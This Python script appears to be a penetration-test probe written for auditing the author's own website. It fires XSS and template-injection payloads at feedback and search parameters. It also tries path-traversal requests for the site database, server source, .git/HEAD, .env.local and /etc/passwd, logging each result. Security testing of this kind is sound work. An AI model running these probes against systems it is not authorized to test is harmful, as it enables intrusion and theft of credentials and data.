#!/usr/bin/env python3
"""06 反射点与前台参数：反馈页 resource 参数、搜索参数、静态路径与 id 校验。"""
import json
import re
import sys
import urllib.parse

sys.path.insert(0, "/media/sunhao/F/Project/sanjiang-resources-site/reports/security/2026-10-21-attacker/scripts")
from probe_client import session, req, csrf_from, BASE, record

RES = {}
DANGER = re.compile(r"onerror=|onload=|onfocus=|autofocus onfocus|<script|<svg|<iframe")


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:600]}")


def main():
    anon = session()
    payloads = [
        ('" onmouseover="alert(1)', 'attr'),
        ('\"><script>alert(1)</script>', 'tag'),
        ('</textarea><script>alert(1)</script>', 'textarea'),
        ('javascript:alert(1)', 'scheme'),
        ('{{7*7}}', 'ssti'),
        ('${7*7}', 'ssti2'),
    ]
    out = []
    for p, label in payloads:
        qs = urllib.parse.quote(p, safe="")
        for path in [f"/feedback/?resource={qs}&kind={qs}", f"/feedback/?kind={qs}",
                     f"/?q={qs}", f"/guides/?q={qs}"]:
            r = anon.get(BASE + path, allow_redirects=False, timeout=20)
            hits = DANGER.findall(r.text)
            raw = p in r.text
            out.append({"path": path[:80], "label": label, "status": r.status_code,
                        "raw_payload": raw, "danger": sorted(set(hits))[:4]})
            record("reflect-" + label + "-" + path.split("?")[0].strip("/").replace("/", "-") or "root",
                   "GET", path, r, extra={"raw_payload": raw})
    note("reflection", out)

    # 静态文件与路径穿越变体
    paths = [
        "/images/../data/site.sqlite", "/images/%2e%2e/data/site.sqlite",
        "/_astro/../package.json", "/_astro/..%2f..%2fpackage.json",
        "/dist/server/entry.mjs", "/src/server/security.ts",
        "/public/images/CREDITS.md", "/images/CREDITS.md",
        "/data/../data/site.sqlite", "/backups/site.sqlite",
        "/.git/HEAD", "/.env.local", "/node_modules/astro/package.json",
        "/api/health/../health/", "//api/health/",
        "/%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/....//....//etc/passwd",
        "/resources/gimp/../../data/site.sqlite",
    ]
    sres = []
    for p in paths:
        r = anon.get(BASE + p, allow_redirects=False, timeout=20)
        sres.append({"path": p, "status": r.status_code, "len": len(r.content),
                     "ctype": r.headers.get("content-type"),
                     "location": r.headers.get("location")})
        record("path-" + re.sub(r"[^a-zA-Z0-9]", "_", p)[:40], "GET", p, r)
    note("path_probes", sres)

    with open("/tmp/sj-attacker/evidence/06-reflection-summary.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
